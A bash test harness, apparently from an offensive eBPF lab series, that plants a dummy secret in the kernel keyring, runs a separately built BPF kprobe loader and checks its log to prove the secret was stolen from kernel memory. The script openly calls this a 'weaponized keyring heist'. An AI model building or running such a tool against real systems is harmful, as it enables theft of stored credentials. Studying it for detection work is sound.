#!/bin/bash
# ch08 trigger — weaponized keyring heist.
#
# Proves REAL payload exfiltration: a known secret is added to the kernel
# keyring, the BPF kprobe reads the actual secret bytes from kernel memory,
# and the trigger verifies the exfiltrated value matches the original.
set +e

HERE="$(cd "$(dirname "$0")" && pwd)"
LOADER="$HERE/build/ch08-keyring-heist"
LOG=/tmp/ch08.log
LPID=""
KEY_ID=""

SECRET="s3cr3t-payload-$(date +%s)"
KEY_DESC="ch08-heist-target-$$"

cleanup() {
    [ -n "$LPID" ] && kill "$LPID" 2>/dev/null && wait "$LPID" 2>/dev/null
    [ -n "$KEY_ID" ] && keyctl revoke "$KEY_ID" >/dev/null 2>&1
}
trap cleanup EXIT INT TERM

if ! command -v keyctl >/dev/null 2>&1; then
    echo "=== CH08_SKIP reason=\"keyctl not installed\" ==="
    exit 0
fi
if [ ! -x "$LOADER" ]; then
    echo "=== CH08_SKIP reason=\"loader not built at $LOADER\" ==="
    exit 0
fi

echo "=== adding keyring entry: desc=$KEY_DESC secret=$SECRET ==="
KEY_ID=$(keyctl add user "$KEY_DESC" "$SECRET" @u 2>&1)
if [ -z "$KEY_ID" ] || echo "$KEY_ID" | grep -qi 'error\|fail'; then
    echo "=== CH08_SKIP reason=\"keyctl add failed: $KEY_ID\" ==="
    exit 0
fi
echo "key_id=$KEY_ID"

echo "=== starting loader ==="
: > "$LOG"
"$LOADER" >"$LOG" 2>>"$LOG" &
LPID=$!
sleep 1

if ! kill -0 "$LPID" 2>/dev/null; then
    echo "=== loader exited early ==="
    cat "$LOG"
    echo "=== CH08_SKIP reason=\"loader exited during startup\" ==="
    exit 0
fi

echo "=== triggering keyring operations ==="
keyctl describe "$KEY_ID" 2>&1 | head -2
keyctl print "$KEY_ID" 2>&1 | head -1
keyctl list @s 2>&1 | head -5
keyctl search @u user "$KEY_DESC" 2>&1 | head -1
# Extra operations to generate more events
keyctl read "$KEY_ID" 2>&1 | head -1
keyctl describe "$KEY_ID" 2>&1 | head -1

sleep 1
kill "$LPID" 2>/dev/null
wait "$LPID" 2>/dev/null
LPID=""

echo "=== loader output ==="
cat "$LOG"

# Verify exfiltration
EXFIL_COUNT=$(grep -c 'EXFIL=' "$LOG" 2>/dev/null)
EXFIL_COUNT=${EXFIL_COUNT:-0}
EVENT_COUNT=$(grep -c '^\[ch08\] hook=' "$LOG" 2>/dev/null)
EVENT_COUNT=${EVENT_COUNT:-0}

# Check if the actual secret appears in the exfiltrated data
SECRET_IN_LOG="no"
if grep -q "$SECRET" "$LOG" 2>/dev/null; then
    SECRET_IN_LOG="yes"
fi

echo "=== summary ==="
echo "events=$EVENT_COUNT exfil_events=$EXFIL_COUNT secret_in_log=$SECRET_IN_LOG"

if [ "$SECRET_IN_LOG" = "yes" ]; then
    echo "=== CH08_WEAPON_PROVEN secret_exfiltrated=yes events=$EVENT_COUNT ==="
elif [ "$EXFIL_COUNT" -gt 0 ]; then
    echo "=== CH08_WEAPON_PROVEN exfil_count=$EXFIL_COUNT events=$EVENT_COUNT ==="
elif [ "$EVENT_COUNT" -gt 0 ]; then
    echo "=== CH08_PROVEN events=$EVENT_COUNT (metadata only) ==="
else
    echo "=== CH08_SKIP reason=\"no keyring events captured\" ==="
fi
